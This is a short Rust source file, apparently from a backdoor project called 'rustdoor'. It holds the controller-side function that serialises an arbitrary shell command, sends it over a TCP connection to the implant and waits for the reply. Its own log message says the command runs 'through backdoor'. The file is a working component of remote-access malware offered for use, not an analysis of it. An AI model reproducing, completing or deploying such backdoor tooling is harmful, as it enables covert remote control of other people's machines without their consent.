use byteorder::{BigEndian, WriteBytesExt};
use rustdoor::communication::messages::{
    MessageType, MessageTypes, RunCommandRequest, MESSAGE_HEADER_LENGTH,
};
use std::io::{Error, Write};
use std::net::TcpStream;

use crate::commanding::get_response;
use rustdoor::communication::serialization::serialize_message;

pub fn run_command(command: String, mut stream: &mut TcpStream) -> Result<(), Error> {
    println!("Running command {} through backdoor.", command);
    let req = RunCommandRequest {
        command,
        async_run: false,
    };
    let msg = serialize_message(req).unwrap();

    println!("Sending buffer {:?}", msg);
    stream.write_all(&msg).unwrap();
    println!("Sent message, awaiting reply...");

    let response = get_response(&mut stream);

    Ok(())
}
